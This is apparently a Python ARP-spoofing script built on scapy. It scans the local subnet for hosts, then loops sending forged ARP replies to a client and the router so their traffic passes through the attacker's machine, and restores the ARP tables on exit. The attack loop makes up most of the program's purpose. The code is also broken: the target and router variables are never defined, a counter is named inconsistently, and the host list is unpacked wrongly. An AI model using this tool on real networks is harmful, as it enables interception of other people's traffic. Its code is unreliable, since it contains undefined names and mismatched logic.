from datetime import datetime
import scapy.all as scapy
import socket
import psutil
import sys
import uuid
import time

from colorama import init
init(autoreset=True)
from colorama import Fore
from colorama import just_fix_windows_console
just_fix_windows_console()



# package functions
def createARPpackage(ip, mac, ipTo, op=2):
    return scapy.ARP(
        op=op,
        pdst=ipTo,
        hwdst=mac,
        psrc=ip
    )  # send to [ipTo]: [ip] has [mac] mac addr.


def sendPackage(package, to):
    return scapy.srp(
        scapy.Ether(
            dst=to
        ) / package,
        timeout=1,
        verbose=False
    )


# current machine info getters
def getMyMac():
    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
    return ':'.join([mac[e:e + 2] for e in range(0, 12, 2)])

def getLocalIpByInterface(interface_name: str):
    net_if_addrs = psutil.net_if_addrs()
    if interface_name in net_if_addrs:
        for addr in net_if_addrs[interface_name]:
            if addr.family == socket.AF_INET:
                return addr.address
    return None


# network scanner

def scan(ip):
    arpPacket = scapy.ARP( # arp request WHO HAS (1) (as default)
			pdst = ip
		)

    broadcast = scapy.Ether(
        dst="ff:ff:ff:ff:ff:ff" # destination (who will take)
    ) # outer shell for sending pack

    arpPush = broadcast / arpPacket

    return scapy.srp(arpPush, timeout=10, verbose=False)[0]


def scanNetwork(mask: str, scanTimes: int=5) -> dict:
    networkScan = {}

    for _ in range(scanTimes):
        try:
            for cl in scan(mask):
                if cl.answer.psrc not in networkScan:
                    print(Fore.GREEN + f'{cl.answer.psrc} with mac {cl.answer.hwsrc} found in network')

                networkScan[cl.answer.psrc] = cl.answer.hwsrc
            print(Fore.YELLOW + f'{datetime.now()}   [{_}/{scanTimes}] Scanning... ', end='\r')

        except KeyboardInterrupt: break

    return networkScan




def main():
    # CONFIGS
    networkScanTimesCount = 5 # how many times am i need to scan local network for devices


    # finding current machine info
    myIp = getLocalIpByInterface(sys.argv[1])
    if myIp is None:
        print(Fore.RED + 'Cannot recognize local ip')
        sys.exit(1)

    networkMask = '.'.join(myIp.split('.')[:-1]) + '.0/24'
    myMac = getMyMac()

    print(f'Machine info: \n IP: {myIp} \n MAC: {myMac} \n Interface: {sys.argv[1]}')


    # scanning network for hosts (arp -a command)
    networkScan = scanNetwork(networkMask, scanTimes=networkScanTimesCount)

    print(f'\n{datetime.now()}   Found devices: ')
    for host, mac in networkScan:
        print(host, '  ', mac)



    #  starting attack
    input('\n\nPress Enter to start funnel.')

    sentPackCount = 0

    while True:
        try:
            sendPackage(createARPpackage(clientIP, myMac, routerIp), 'ff:ff:ff:ff:ff:ff')
            sendPackage(createARPpackage(routerIp, myMac, clientIP), 'ff:ff:ff:ff:ff:ff')

            sendedPackCount += 2
            print(f'[{sendedPackCount}] sent package'),

            time.sleep(1)
        except KeyboardInterrupt:
            sendPackage(createARPpackage(clientIP, clientMac, routerIp), 'ff:ff:ff:ff:ff:ff')
            sendPackage(createARPpackage(routerIp, routerMac, clientIP), 'ff:ff:ff:ff:ff:ff')
            print('Arp table has been restored.')

            exit()


if __name__ == '__main__': main()